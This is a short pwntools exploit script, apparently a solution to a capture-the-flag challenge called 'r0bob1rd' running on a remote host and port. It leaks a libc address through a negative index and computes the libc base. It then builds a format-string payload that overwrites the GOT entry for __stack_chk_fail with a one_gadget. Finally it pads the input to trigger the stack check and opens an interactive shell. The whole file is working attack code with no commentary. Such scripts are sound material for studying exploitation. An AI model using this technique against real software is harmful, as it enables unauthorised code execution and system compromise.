from pwn import *

elf = context.binary = ELF('r0bob1rd')

#pr = process()
pr = remote('94.237.54.190',55945)
libc = elf.libc
print(elf.symbols)
#gdb.attach(pr)
pr.recvuntil(b'Select a R0bob1rd >')
pr.sendline(b'-16')

pr.recvuntil(b'chosen: ')
ln = pr.recvline()[:-1]

puts_leak = int.from_bytes(ln,'little')

libc_addr = puts_leak - libc.symbols['puts']
libc.address = libc_addr
print(hex(libc.address))

one_gadget = 0xe3b01
fmt_str = fmtstr_payload(8, {elf.got['__stack_chk_fail']: libc.address+one_gadget}, write_size='short')
print(len(fmt_str))
pr.sendline(fmt_str+b'a'*(105-len(fmt_str)))
#pr.sendline(b'/bin/sh')
pr.interactive()